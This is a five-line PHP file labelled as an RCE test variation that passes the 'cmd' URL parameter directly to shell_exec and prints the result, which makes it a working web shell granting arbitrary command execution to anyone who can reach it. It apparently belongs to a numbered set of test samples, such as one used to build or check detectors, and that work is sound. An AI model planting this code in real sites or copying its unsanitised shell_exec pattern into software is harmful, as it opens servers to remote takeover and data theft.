<?php
// RCE test variation #984
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>